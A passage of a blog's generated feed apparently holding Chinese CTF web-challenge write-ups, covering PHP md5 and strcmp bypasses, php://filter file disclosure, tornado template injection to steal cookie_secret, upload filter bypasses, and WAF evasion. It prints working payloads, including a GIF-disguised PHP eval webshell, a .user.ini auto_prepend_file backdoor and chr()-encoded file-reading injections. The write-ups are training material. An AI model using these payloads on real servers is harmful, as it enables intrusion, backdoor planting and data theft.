的时候会先把两边的类型转成一样的，因为是0e开头，php会认为它是科学计数法，而0的多少次方都是0。</li><li>方法二：数组绕过。原理：md5等函数不能处理数组，导致函数返回Null，而Null永远等于Null。传入参数：<code>?a[]=1&amp;b[]=2</code></li></ul><p>同样是一段源码：</p><pre><code>&lt;?phperror_reporting(0);include &quot;flag.php&quot;;highlight_file(__FILE__);if($_POST[&#39;param1&#39;]!==$_POST[&#39;param2&#39;]&amp;&amp;md5($_POST[&#39;param1&#39;])===md5($_POST[&#39;param2&#39;]))&#123;    echo $flag;&#125;</code></pre><p>这回是强类型比较，而且需要post传参。这里同样可以使用数组来绕过，传入参数：<code>param1[]=1&amp;param2[]=2</code>，成功获取到flag。<br><img src="https://i.loli.net/2020/08/24/C2xwiubm4nHS3tW.png"></p><h2 id="0x01知识点"><a href="#0x01知识点" class="headerlink" title="0x01知识点"></a>0x01知识点</h2><p><strong>1.php中md5注入的绕过；<br>2.php弱类型比较绕过；<br>3.php强类型比较绕过。</strong></p>]]></content>
+      
+      
+      <categories>
+          
+          <category> ctf </category>
+          
+      </categories>
+      
+      
+        <tags>
+            
+            <tag> web </tag>
+            
+            <tag> SQL注入 </tag>
+            
+            <tag> 代码审计 </tag>
+            
+        </tags>
+      
+    </entry>
+    
+    
+    
+    <entry>
+      <title>[极客大挑战 2019]Secret File</title>
+      <link href="/2020/08/23/ji-ke-da-tiao-zhan-2019-secret-file/"/>
+      <url>/2020/08/23/ji-ke-da-tiao-zhan-2019-secret-file/</url>
+      
+        <content type="html"><![CDATA[<h2 id="0x01解题"><a href="#0x01解题" class="headerlink" title="0x01解题"></a>0x01解题</h2><p>（挺简单的一道题，不知道我为什么会写下来，算了，写都写了…）<br>上来就是某大佬的秘密，右键查看一下源码<br><img src="https://i.loli.net/2020/08/23/DCcEOt5UV6T2FxG.png"><br>访问Archive_room.php<br><img src="https://i.loli.net/2020/08/23/7Z5Ha4by6DOgzpT.png"><br>点开secret<br><img src="https://i.loli.net/2020/08/23/Q4cRsGDhTBlvSmP.png"><br>应该是被重定向了，抓一下包吧<br><img src="https://i.loli.net/2020/08/23/x8ifHWPYUma5v2G.png"><br>访问secr3t.php，是一段php源码</p><pre><code>&lt;?php    highlight_file(__FILE__);    error_reporting(0);    $file=$_GET[&#39;file&#39;];    if(strstr($file,&quot;../&quot;)||stristr($file, &quot;tp&quot;)||stristr($file,&quot;input&quot;)||stristr($file,&quot;data&quot;))&#123;        echo &quot;Oh no!&quot;;        exit();    &#125;    include($file); //flag放在了flag.php里?&gt;</code></pre><p>前面是一些过滤，为了防止我们干坏事，但无关紧要。定位到<code>include($file);</code>，很明显的文件包含漏洞，传入<code>?file=flag.php</code><br><img src="https://i.loli.net/2020/08/23/s5lEzfXY1gu3krK.png"><br>源码不可见，那么使用php://filter伪协议来查看源码，payload：<code>?file=php://filter/read=convert.base64-encode/resource=flag.php</code><br>源码：</p><pre><code>PCFET0NUWVBFIGh0bWw+Cgo8aHRtbD4KCiAgICA8aGVhZD4KICAgICAgICA8bWV0YSBjaGFyc2V0PSJ1dGYtOCI+CiAgICAgICAgPHRpdGxlPkZMQUc8L3RpdGxlPgogICAgPC9oZWFkPgoKICAgIDxib2R5IHN0eWxlPSJiYWNrZ3JvdW5kLWNvbG9yOmJsYWNrOyI+PGJyPjxicj48YnI+PGJyPjxicj48YnI+CiAgICAgICAgCiAgICAgICAgPGgxIHN0eWxlPSJmb250LWZhbWlseTp2ZXJkYW5hO2NvbG9yOnJlZDt0ZXh0LWFsaWduOmNlbnRlcjsiPuWViuWTiO+8geS9oOaJvuWIsOaIkeS6hu+8geWPr+aYr+S9oOeci+S4jeWIsOaIkVFBUX5+fjwvaDE+PGJyPjxicj48YnI+CiAgICAgICAgCiAgICAgICAgPHAgc3R5bGU9ImZvbnQtZmFtaWx5OmFyaWFsO2NvbG9yOnJlZDtmb250LXNpemU6MjBweDt0ZXh0LWFsaWduOmNlbnRlcjsiPgogICAgICAgICAgICA8P3BocAogICAgICAgICAgICAgICAgZWNobyAi5oiR5bCx5Zyo6L+Z6YeMIjsKICAgICAgICAgICAgICAgICRmbGFnID0gJ2ZsYWd7OWNhNmUwZGEtNWRmMy00ZDYxLTg2ZDQtNzQ1OTI4NjI2YTVmfSc7CiAgICAgICAgICAgICAgICAkc2VjcmV0ID0gJ2ppQW5nX0x1eXVhbl93NG50c19hX2cxcklmcmkzbmQnCiAgICAgICAgICAgID8+CiAgICAgICAgPC9wPgogICAgPC9ib2R5PgoKPC9odG1sPgo=</code></pre><p>base64解码：</p><pre><code>&lt;!DOCTYPE html&gt;&lt;html&gt;    &lt;head&gt;        &lt;meta charset=&quot;utf-8&quot;&gt;        &lt;title&gt;FLAG&lt;/title&gt;    &lt;/head&gt;    &lt;body style=&quot;background-color:black;&quot;&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;        &lt;h1 style=&quot;font-family:verdana;color:red;text-align:center;&quot;&gt;xxx&lt;/h1&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;        &lt;p style=&quot;font-family:arial;color:red;font-size:20px;text-align:center;&quot;&gt;            &lt;?php                echo &quot;xxx&quot;;                $flag = &#39;flag&#123;9ca6e0da-5df3-4d61-86d4-745928626a5f&#125;&#39;;                $secret = &#39;jiAng_Luyuan_w4nts_a_g1rIfri3nd&#39;            ?&gt;        &lt;/p&gt;    &lt;/body&gt;&lt;/html&gt;</code></pre><p>flag很明显了，秘密也很明显了，大佬想要一个女朋友。</p><h2 id="0x02知识点"><a href="#0x02知识点" class="headerlink" title="0x02知识点"></a>0x02知识点</h2><p><strong>php://filter伪协议读取文件/源码。</strong></p>]]></content>
+      
+      
+      <categories>
+          
+          <category> ctf </category>
+          
+      </categories>
+      
+      
+        <tags>
+            
+            <tag> web </tag>
+            
+            <tag> 代码审计 </tag>
+            
+            <tag> php伪协议 </tag>
+            
+        </tags>
+      
+    </entry>
+    
+    
+    
+    <entry>
+      <title>[护网杯 2018]easy_tornado</title>
+      <link href="/2020/08/21/hu-wang-bei-2018-easy-tornado/"/>
+      <url>/2020/08/21/hu-wang-bei-2018-easy-tornado/</url>
+      
+        <content type="html"><![CDATA[<h2 id="0x00解题"><a href="#0x00解题" class="headerlink" title="0x00解题"></a>0x00解题</h2><p>很真实，进来就有三个hint，分别打开查看一下内容<br><img src="https://i.loli.net/2020/08/23/i31AGWkVc2bZDQo.png" alt="ctf"><br><img src="https://i.loli.net/2020/08/23/oeckL4zuqHUMNDa.png" alt="ctf"><br><img src="https://i.loli.net/2020/08/23/iPlyJQhoWug2UYc.png" alt="ctf"><br><img src="https://i.loli.net/2020/08/23/QpAxryNWeCvFf2E.png" alt="ctf"><br>第一个提示，flag在/fll…lag文件中；第二个提示，render结合题目名tornado（一种python框架）猜测是python的模板注入漏洞；第三个提示很明显需要我们获取到cookie_secret，再结合三个文件的url（tornado框架中url是由filename和filehash组成的，所以想要查看fll…lag文件必须要获取到其filehash值）猜测这是filehash的加密方式。</p><ul><li>第一步，获取handler.setting<br>首先测试模板注入漏洞是否存在，当传入的filename和filehash不匹配时会返回这个页面<br><img src="https://i.loli.net/2020/08/23/p6iwmaPWfycOUXr.png" alt="ctf"><br>如下图传入参数<br><img src="https://i.loli.net/2020/08/23/5HgDSWkEPCu1mKf.png" alt="ctf"><br>根据回显确实存在这个漏洞，并且注入点就在msg处。tornado框架中cookie_secret在<code>handler.settings</code>这个文件中，于是利用模板注入漏洞来查看文件内容，如下图传入参数，成功获取到cookie_secret<br><img src="https://i.loli.net/2020/08/23/9TQqsjWoOaIZCtE.png" alt="ctf"></li><li>第二步，获取filehash<br>根据第三个提示写一个php脚本<pre><code>&lt;?php$filename = &#39;/fllllllllllllag&#39;;$cookie_secret = &#39;fe887fa5-d175-4b6d-a600-de89829a86bc&#39;;$filehash = md5($cookie_secret.md5($filename));echo $filehash;?&gt;</code></pre>成功获取到filehash的值<br><img src="https://i.loli.net/2020/08/23/Hcvhdmp6wut25L8.png" alt="ctf"></li><li>第三步，获取flag<br>根据获取到的filehash值构造payload<br><code>?filename=/fllllllllllllag&amp;filehash=87f637cf9951720c2553fc1a1cdee4cc</code><br>得到flag<br><img src="https://i.loli.net/2020/08/23/BPRK9dAWVpI3a16.png" alt="ctf"></li></ul><h2 id="0x01知识点"><a href="#0x01知识点" class="headerlink" title="0x01知识点"></a>0x01知识点</h2><p><strong>python SSTI tornado render模板注入：tornado render是python中的一个渲染函数，也就是一种模板，通过调用的参数不同，生成不同的网页，如果用户对render内容可控，不仅可以注入XSS代码，而且还可以通过双大括号进行传递变量和执行简单的表达式，和flask类似。<br>render是一个类似模板的东西，可以使用不同的参数来访问网页。在tornado的模板中，存在一些可以访问的快速对象，本题中双大括号中的字典对象就是<code>handler.settings</code>对象，<code>handler</code>指向<code>RequestHandler</code>，而<code>RequestHandler.settings</code>又指向<code>self.application.settings</code>，所以<code>handler.settings</code>就指向<code>RequestHandler.application.settings</code>。这里面就是我们一些环境变量，我们正是从这里获取的cookie_secret</strong></p>]]></content>
+      
+      
+      <categories>
+          
+          <category> ctf </category>
+          
+      </categories>
+      
+      
+        <tags>
+            
+            <tag> web </tag>
+            
+            <tag> python模板注入 </tag>
+            
+        </tags>
+      
+    </entry>
+    
+    
+    
+    <entry>
+      <title>[极客大挑战 2019]Upload</title>
+      <link href="/2020/08/20/ji-ke-da-tiao-zhan-2019-upload/"/>
+      <url>/2020/08/20/ji-ke-da-tiao-zhan-2019-upload/</url>
+      
+        <content type="html"><![CDATA[<h2 id="0x01解题"><a href="#0x01解题" class="headerlink" title="0x01解题"></a>0x01解题</h2><p>（这道题挺简单的，但是发现需要绕过的地方还是有一丢丢多，想着还是写一下，方便复习，这里因为图片上传到服务器的时候失真了，所以我就直接贴代码）<br>打开页面很直接，就是让我们传一个马上去拿shell，试着传一个php文件，提示只能传入image</p><pre><code>(Respoonse)&lt;strong&gt;Not image!&lt;/strong&gt;&lt;/div&gt;</code></pre><ul><li>第一处绕过：<br>然后我们注意到Content-Type那里是application/octet-stream，需要改成image/jpeg<pre><code>(Response)&lt;strong&gt;NOT！php!&lt;/strong&gt;&lt;/div&gt;</code></pre></li><li>第二处绕过：<br>这里明显后缀不能是php，fuzz一下发现后缀可以为<code>.phtml</code>，换了一种方式来提示<pre><code>(Response)&lt;strong&gt;Don&#39;t lie to me, it&#39;s not image at all!!!&lt;/strong&gt;&lt;/div&gt;</code></pre></li><li>第三处绕过：<br>试着加上文件头GIF 98A，成功绕过，但是提示文件内容不能包含&lt;?<pre><code>(Response)&lt;strong&gt;NO! HACKER! your file included &#39;&amp;#x3C;&amp;#x3F;&#39;&lt;/strong&gt;&lt;/div&gt;</code></pre></li><li>第四处绕过：<br>这里可以使用js脚本来绕过，将文件内容改为<pre><code>GIF 98A&lt;script language=&quot;php&quot;&gt;@eval($_POST[&#39;three&#39;]);&lt;/script&gt;</code></pre></li></ul><p>文件上传成功，用菜刀链接得到flag。</p><h2 id="0x02知识点"><a href="#0x02知识点" class="headerlink" title="0x02知识点"></a>0x02知识点</h2><p><strong>1.绕过MIME-Type验证；<br>2.绕过黑名单验证；<br>3.js脚本绕过；<br>4.文件头GIF98A制作图片webshell。</strong></p>]]></content>
+      
+      
+      <categories>
+          
+          <category> ctf </category>
+          
+      </categories>
+      
+      
+        <tags>
+            
+            <tag> web </tag>
+            
+            <tag> 文件上传 </tag>
+            
+        </tags>
+      
+    </entry>
+    
+    
+    
+    <entry>
+      <title>[SUCTF 2019]CheckIn</title>
+      <link href="/2020/08/19/suctf-2019-checkin/"/>
+      <url>/2020/08/19/suctf-2019-checkin/</url>
+      
+        <content type="html"><![CDATA[<h2 id="0x01解题"><a href="#0x01解题" class="headerlink" title="0x01解题"></a>0x01解题</h2><p>（虽然图片画质出了点问题，但大体思路还是很清楚的，将就看2333）<br>打开页面，上传一个shell.php，明显被过滤了<br><img src="http://qf8xpljbn.hn-bkt.clouddn.com/ctf7.png" alt="avatar"><br>将后缀改成.jpg试一试<br><img src="http://qf8xpljbn.hn-bkt.clouddn.com/ctf9.png" alt="avatar"><br>发现使用的是<code>exif_imagetype()</code>这个函数来获取的文件类型，可以通过添加文件头<code>GIF 98A</code>来绕过<br><img src="http://qf8xpljbn.hn-bkt.clouddn.com/ctf8.png" alt="avatar"><br>很明显，文件内容里不能包含<code>?&gt;</code>这种特殊字符，于是将文件内容修改为</p><pre><code>GIF 98A&lt;script language=&quot;php&quot;&gt;@eval($_POST[&#39;three&#39;]);&lt;/script&gt;</code></pre><ul><li><p>思路一：<code>.htacess</code><br>上传成功之后，我们想到可以通过上传<code>.htaccess</code>文件来将shell.jpg解析成php文件，</p><pre><code>GIF 98A&lt;FilesMatch &quot;shell.jpg&quot;&gt;SetHandler application/x-httpd-php&lt;/FilesMatch&gt;</code></pre><p>上传成功<br><img src="http://qf8xpljbn.hn-bkt.clouddn.com/ctf10.png" alt="avatar"><br>但是使用菜刀连了一下没有成功，猜测.htaccess文件作为局部变量作用文件成功作用的两个条件没有满足。</p><pre><code>.htaccess文件作为局部变量作用文件成功作用的两个条件1、Allow Override All2、LoadModule rewrite_module modules/mod_rewrite.so #rewrite模块为开启状态</code></pre></li><li><p>思路二：<code>.user.ini</code></p><h3 id="什么是-user-ini呢？"><a href="#什么是-user-ini呢？" class="headerlink" title="什么是.user.ini呢？"></a>什么是.user.ini呢？</h3><p>这得从php.ini说起了。php.ini是php默认的配置文件，其中包括了很多php的配置，这些配置中，又分为几种：PHP_INI_SYSTEM、PHP_INI_PERDIR、PHP_INI_ALL、PHP_INI_USER。 在此可以查看：<a href="http://php.net/manual/zh/ini.list.php">http://php.net/manual/zh/ini.list.php</a> 这几种模式有什么区别？看看官方的解释：<br><img src="http://qf8xpljbn.hn-bkt.clouddn.com/ctf11.png" alt="avatar"><br>其中就提到了，模式为PHP_INI_USER的配置项，可以在ini_set()函数中设置、注册表中设置，再就是.user.ini中设置。 这里就提到了.user.ini，那么这是个什么配置文件？那么官方文档在这里又解释了：<br>除了主 php.ini 之外，PHP 还会在每个目录下扫描 INI 文件，从被执行的 PHP 文件所在目录开始一直上升到 web 根目录（$_SERVER[‘DOCUMENT_ROOT’] 所指定的）。如果被执行的 PHP 文件在 web 根目录之外，则只扫描该目录。<br>在 .user.ini 风格的 INI 文件中只有具有 PHP_INI_PERDIR 和 PHP_INI_USER 模式的 INI 设置可被识别。<br>这里就很清楚了，.user.ini实际上就是一个可以由用户“自定义”的php.ini，我们能够自定义的设置是模式为“PHP_INI_PERDIR 、 PHP_INI_USER”的设置。（上面表格中没有提到的PHP_INI_PERDIR也可以在.user.ini中设置）<br>实际上，除了PHP_INI_SYSTEM以外的模式（包括PHP_INI_ALL）都是可以通过.user.ini来设置的。<br>而且，和php.ini不同的是，.user.ini是一个能被动态加载的ini文件。也就是说我修改了.user.ini后，不需要重启服务器中间件，只需要等待user_ini.cache_ttl所设置的时间（默认为300秒），即可被重新加载。<br>然后我们看到php.ini中的配置项，可惜我沮丧地发现，只要稍微敏感的配置项，都是PHP_INI_SYSTEM模式的（甚至是php.ini only的），包括disable_functions、extension_dir、enable_dl等。 不过，我们可以很容易地借助.user.ini文件来构造一个“后门”。<br>Php配置项中有两个比较有意思的项（下图第一、四个）：<br><img src="http://qf8xpljbn.hn-bkt.clouddn.com/ctf12.png" alt="avatar"><br>auto_append_file、auto_prepend_file，点开看看什么意思：<br><img src="http://qf8xpljbn.hn-bkt.clouddn.com/ctf13.png" alt="avatar"><br>指定一个文件，自动包含在要执行的文件前，类似于在文件前调用了require()函数。而auto_append_file类似，只是在文件后面包含。 使用方法很简单，直接写在.user.ini中：<br><code>auto_prepend_file=shell.jpg</code>其中shell.jpg是要包含的文件<br>参考链接：<a href="https://wooyun.js.org/drops/user.ini%E6%96%87%E4%BB%B6%E6%9E%84%E6%88%90%E7%9A%84PHP%E5%90%8E%E9%97%A8.html">https://wooyun.js.org/drops/user.ini%E6%96%87%E4%BB%B6%E6%9E%84%E6%88%90%E7%9A%84PHP%E5%90%8E%E9%97%A8.html</a></p><h3 id="解题"><a href="#解题" class="headerlink" title="解题"></a>解题</h3><p>在知道什么是.use.ini之后，这道题就有眉目了。我们可以上传一个.user.ini文件来替代之前.htaccess的作用。<strong>注意：目录下面一定要有一个正常的php文件！</strong>而在之前上传文件成功的回显来看，目录下面确实存在一个index.php。.user.ini文件内容：</p><pre><code>GIF 98Aauto_prepend_file=shell.jpg</code></pre><p>扫描目录发现了有一个flag文件<code>three=var_dump(scandir(&quot;/&quot;));</code><br>查看flag文件<code>three=var_dump(file_get_contents(&quot;/flag&quot;));</code></p></li></ul><h2 id="0x02知识点"><a href="#0x02知识点" class="headerlink" title="0x02知识点"></a>0x02知识点</h2><p><strong>1.利用<code>.user.ini</code>上传\隐藏后门<br>使用条件：<br>(1)服务器脚本语言为PHP；<br>(2)对应目录下面有可执行的php文件；<br>(3)服务器使用CGI／FastCGI模式。</strong><br><strong>2.绕过<code>exif_imagetype()</code>。</strong></p>]]></content>
+      
+      
+      <categories>
+          
+          <category> ctf </category>
+          
+      </categories>
+      
+      
+        <tags>
+            
+            <tag> web </tag>
+            
+            <tag> 文件上传 </tag>
+            
+        </tags>
+      
+    </entry>
+    
+    
+    
+    <entry>
+      <title>[RoarCTF 2019]Easy Calc</title>
+      <link href="/2020/08/18/roarctf-2019-easy-calc/"/>
+      <url>/2020/08/18/roarctf-2019-easy-calc/</url>
+      
+        <content type="html"><![CDATA[<h2 id="0x01解题"><a href="#0x01解题" class="headerlink" title="0x01解题"></a>0x01解题</h2><p>打开页面是一个简单的计算器，查看源码，发现了一个javascript脚本，并且提示使用了WAF</p><pre><code>&lt;!--I&#39;ve set up WAF to ensure security.--&gt;&lt;script&gt;    $(&#39;#calc&#39;).submit(function()&#123;        $.ajax(&#123;            url:&quot;calc.php?num=&quot;+encodeURIComponent($(&quot;#content&quot;).val()),            type:&#39;GET&#39;,            success:function(data)&#123;                $(&quot;#result&quot;).html(`&lt;div class=&quot;alert alert-success&quot;&gt;            &lt;strong&gt;答案:&lt;/strong&gt;$&#123;data&#125;            &lt;/div&gt;`);            &#125;,            error:function()&#123;                alert(&quot;这啥?算不来!&quot;);            &#125;        &#125;)        return false;    &#125;)&lt;/script&gt;</code></pre><p>看到很明显的calc.php，访问一下得到源码</p><pre><code>&lt;?phperror_reporting(0);if(!isset($_GET[&#39;num&#39;]))&#123;    show_source(__FILE__);&#125;else&#123;        $str = $_GET[&#39;num&#39;];        $blacklist = [&#39; &#39;, &#39;\t&#39;, &#39;\r&#39;, &#39;\n&#39;,&#39;\&#39;&#39;, &#39;&quot;&#39;, &#39;`&#39;, &#39;\[&#39;, &#39;\]&#39;,&#39;\$&#39;,&#39;\\&#39;,&#39;\^&#39;];        foreach ($blacklist as $blackitem) &#123;                if (preg_match(&#39;/&#39; . $blackitem . &#39;/m&#39;, $str)) &#123;                        die(&quot;what are you want to do?&quot;);                &#125;        &#125;        eval(&#39;echo &#39;.$str.&#39;;&#39;);&#125;?&gt;</code></pre><p>需要我们传入参数num，并且使用了正则对一些特殊符号进行了过滤。需要注意的是，当php进行解析的时候，如果变量前面有空格，会去掉前面的空格并将一些特殊符号转换为下划线再解析，那么这时候<code>xxx.php? num=xxx</code>和<code>xxx.php?num=xxx</code>是等价的，而WAF在检查的时候不一定能够正确解析，从而识别不出num这个参数（通俗来讲就是：这样waf就找不到num这个变量了，因为现在的变量叫“ num”，而不是“num”），由此就可以绕过WAF的检测。而正则的过滤则可以使用<code>chr()</code>函数进行绕过。</p><ul><li>首先使用<code>scandir()</code>函数列出目录，payload：<code>? num=1;var_dump(scandir(chr(47)))</code>，返回值：<pre><code>1array(24) &#123; [0]=&gt; string(1) &quot;.&quot; [1]=&gt; string(2) &quot;..&quot; [2]=&gt; string(10) &quot;.dockerenv&quot; [3]=&gt; string(3) &quot;bin&quot; [4]=&gt; string(4) &quot;boot&quot; [5]=&gt; string(3) &quot;dev&quot; [6]=&gt; string(3) &quot;etc&quot; [7]=&gt; string(5) &quot;f1agg&quot; [8]=&gt; string(4) &quot;home&quot; [9]=&gt; string(3) &quot;lib&quot; [10]=&gt; string(5) &quot;lib64&quot; [11]=&gt; string(5) &quot;media&quot; [12]=&gt; string(3) &quot;mnt&quot; [13]=&gt; string(3) &quot;opt&quot; [14]=&gt; string(4) &quot;proc&quot; [15]=&gt; string(4) &quot;root&quot; [16]=&gt; string(3) &quot;run&quot; [17]=&gt; string(4) &quot;sbin&quot; [18]=&gt; string(3) &quot;srv&quot; [19]=&gt; string(8) &quot;start.sh&quot; [20]=&gt; string(3) &quot;sys&quot; [21]=&gt; string(3) &quot;tmp&quot; [22]=&gt; string(3) &quot;usr&quot; [23]=&gt; string(3) &quot;var&quot; &#125;</code></pre></li><li>可以看到f1agg这个文件，猜测flag就在这个文件里面，可以使用<code>file_get_contents()</code>函数来获取文件内容，payload：<br><code>? num=1;var_dump(file_get_contents(chr(47).chr(102).chr(49).chr(97).chr(103).chr(103)))</code><br>成功获取到flag。<br><img src="http://qf8xpljbn.hn-bkt.clouddn.com/ctf6.png" alt="avatar"><h2 id="0x02知识点"><a href="#0x02知识点" class="headerlink" title="0x02知识点"></a>0x02知识点</h2></li></ul><p><strong>1.使用到的函数：<br><code>vardump()</code>将变量以字符串形式输出，替代print和echo<br><code>chr()</code>ASCII范围的整数转字符<br><code>file_get_contents()</code>顾名思义获取一个文件的内容，替代system(‘cat flag;’)<br><code>scandir()</code>扫描某个目录并将结果以array形式返回，配和vardump 可以替代system(‘ls;’)</strong><br><strong>2.利用php和WAF对于请求参数解析的差异达到绕过的目的</strong></p>]]></content>
+      
+      
+      <categories>
+          
+          <category> ctf </category>
+          
+      </categories>
+      
+      
+        <tags>
+            
+            <tag> web </tag>
+            
+            <tag> 代码审计 </tag>
+            
+            <tag> RCE </tag>
+            
+        </tags>
+      
+    </entry>
+    
+    
+    
+    <entry>
+      <title>[极客大挑战 2019]BuyFlag</title>
+      <link href="/2020/08/18/ji-ke-da-tiao-zhan-2019-buyflag/"/>
+      <url>/2020/08/18/ji-ke-da-tiao-zhan-2019-buyflag/</url>
+      
+        <content type="html"><![CDATA[<h2 id="0x01解题"><a href="#0x01解题" class="headerlink" title="0x01解题"></a>0x01解题</h2><p>右键查看源码，发现了一个pay.php<br><img src="http://qf8xpljbn.hn-bkt.clouddn.com/ctf1.png" alt="avatar"><br>访问页面提示如果要购买flag需要满足两个条件<br><img src="http://qf8xpljbn.hn-bkt.clouddn.com/ctf2.png" alt="avatar"><br>右键查看源码发现了一段被注释的php源码</p><pre><code>&lt;!--    ~~~post money and password~~~if (isset($_POST[&#39;password&#39;])) &#123;    $password = $_POST[&#39;password&#39;];    if (is_numeric($password)) &#123;        echo &quot;password can&#39;t be number&lt;/br&gt;&quot;;    &#125;elseif ($password == 404) &#123;        echo &quot;Password Right!&lt;/br&gt;&quot;;    &#125;&#125;--&gt;</code></pre><ul><li>源码提示通过post方式传入money和password，并且password不能为数字或数字字符串，这里使用<code>is_numeric()</code>函数来检测。但是源码告诉我们password为404，那么就需要对<code>is_numeric()</code>函数进行绕过。而<code>is_numeric()</code>函数对于空字符%00，无论是%00放在前后都可以判断为非数值，所以传入参数<code>password=404%00</code>。</li><li>burp抓包，这里cookie的user值为0，猜测是用来判断第一个条件的，于是将user改为1，成功满足购买flag的两个条件<br><img src="http://qf8xpljbn.hn-bkt.clouddn.com/ctf4.png" alt="avatar"></li></ul><p>继续传入money参数，但是提示不能超过8位字符，根据响应头中的php版本为5.3.3，猜测是使用的<code>strcmp()</code>函数来进行比较的，于是在money后面加上[]来绕过检测，传入参数<code>money[]=1</code>，得到flag。<br><img src="http://qf8xpljbn.hn-bkt.clouddn.com/ctf5.png" alt="avatar"></p><h2 id="0x02知识点"><a href="#0x02知识点" class="headerlink" title="0x02知识点"></a>0x02知识点</h2><p><strong>1.php中<code>is_numeric()</code>漏洞，<code>is_numeric()</code>函数对于空字符%00，无论是%00放在前后都可以判断为非数值，而%20空格字符只能放在数值后。该函数对于第一个空格字符会跳过空格字符判断，接着后面的判断。</strong><br><strong>2.php中<code>strcmp()</code>漏洞，语法：<code>strcmp ( string $str1 , string $str2 )</code>。返回值：①如果两个字符串相等，返回0；②如果str1小于str2，返回&lt;0；如果str1大于str2，返回&gt;0。在本题中，传入<code>money[]=1</code>会导致逻辑为<code>0=strcmp(&#39;100000000&#39;,$money)</code>，相当于成功通过了检测。</strong></p>]]></content>
+      
+      
+      <categories>
+          
+          <category> ctf </category>
+          
+      </categories>
+      
+      
+        <tags>
+            
+            <tag> web </tag>
+            
+            <tag> 代码审计 </tag>
+            
+        </tags>
+      
+    </entry>
+    
+    
+    
+    <entry>
+      <title>[ZJCTF 2019]NiZhuanSiWei</title>
+      <link href="/2020/08/17/zjctf-2019-nizhuansiwei/"/>
+      <url>/2020/08/17/zjctf-2019-nizhuansiwei/</url>
+      
+        <content type="html"><![CDATA[<h2 id="0x01解题"><a href="#0x01解题" class="headerlink" title="0x01解题"></a>0x01解题</h2><p>打开题目，给出了源码</p><pre class=" language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span>  <span class="token variable">$text</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">"text"</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token variable">$file</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">"file"</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token variable">$password</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">"password"</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">isset</span><span class="token punctuation">(</span><span class="token variable">$text</span><span class="token punctuation">)</span><span class="token operator">&amp;&amp;</span><span class="token punctuation">(</span><span class="token function">file_get_contents</span><span class="token punctuation">(</span><span class="token variable">$text</span><span class="token punctuation">,</span><span class="token string">'r'</span><span class="token punctuation">)</span><span class="token operator">===</span><span class="token string">"welcome to the zjctf"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">&amp;</span><span class="token shell-comment comment">#123;</span>    <span class="token keyword">echo</span> <span class="token string">"&lt;br>&lt;h1>"</span><span class="token punctuation">.</span><span class="token function">file_get_contents</span><span class="token punctuation">(</span><span class="token variable">$text</span><span class="token punctuation">,</span><span class="token string">'r'</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token string">"&lt;/h1>&lt;/br>"</span><span class="token punctuation">;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string">"/flag/"</span><span class="token punctuation">,</span><span class="token variable">$file</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">&amp;</span><span class="token shell-comment comment">#123;</span>        <span class="token keyword">echo</span> <span class="token string">"Not now!"</span><span class="token punctuation">;</span>        <span class="token function">exit</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>     <span class="token operator">&amp;</span><span class="token shell-comment comment">#125;else&amp;#123;</span>        <span class="token keyword">include</span><span class="token punctuation">(</span><span class="token variable">$file</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token comment" spellcheck="true">//useless.php</span>        <span class="token variable">$password</span> <span class="token operator">=</span> <span class="token function">unserialize</span><span class="token punctuation">(</span><span class="token variable">$password</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">echo</span> <span class="token variable">$password</span><span class="token punctuation">;</span>    <span class="token operator">&amp;</span><span class="token shell-comment comment">#125;</span><span class="token operator">&amp;</span><span class="token shell-comment comment">#125;</span><span class="token keyword">else</span><span class="token operator">&amp;</span><span class="token shell-comment comment">#123;</span>    <span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token operator">&amp;</span><span class="token shell-comment comment">#125;</span><span class="token delimiter">?></span></code></pre><ul><li>第一处绕过<br><code>if(isset($text)&amp;&amp;(file_get_contents($text,&#39;r&#39;)===&quot;welcome to the zjctf&quot;))</code><br>这里检测变量text是否设置，即文件是否存在，那么需要我们传入一个文件并且文件内容为”welcome to the zjctf”，可以使用到data伪协议，data伪协议通常是用来执行php代码，我们也可以将内容写入data协议中然后让file_get_contents函数取读取。传入参数如下：<br><code>text=data://text/plain;base64,d2VsY29tZSB0byB0aGUgempjdGY=</code><br>这里使用base64编码是为了绕过某些过滤。本题也可以不使用base64编码。</li><li>第二处绕过<pre><code>if(preg_match(&quot;/flag/&quot;,$file))&#123;  echo &quot;Not now!&quot;;  exit(); &#125;else&#123;  include($file);  //useless.php  $password = unserialize($password);  echo 